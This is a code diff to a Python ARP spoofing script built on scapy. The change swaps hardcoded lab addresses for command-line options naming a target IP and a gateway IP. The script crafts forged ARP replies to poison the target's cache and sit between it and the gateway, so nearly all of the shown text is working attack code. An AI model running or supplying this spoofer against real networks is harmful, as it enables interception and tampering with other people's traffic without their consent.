@@ -1,5 +1,14 @@
 import scapy.all as scapy
 import time
+import argparse
+
+parser = argparse.ArgumentParser()                                               
+parser.add_argument('-t', help="IP of the target", required=True)
+parser.add_argument('-g', help="IP of the gateway", required=True)
+args = parser.parse_args()
+
+target_ip = (args.t)
+gateway_ip = (args.g)
   
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
@@ -11,9 +20,6 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
     scapy.send(packet, verbose = False) # Build and send packet with obtained MAC and user input as parameters 
-      
-target_ip = "10.0.2.5" # Enter your target's IP
-gateway_ip = "10.0.2.1" # Enter your gateway's IP
   
 try:
     packets_count = 0
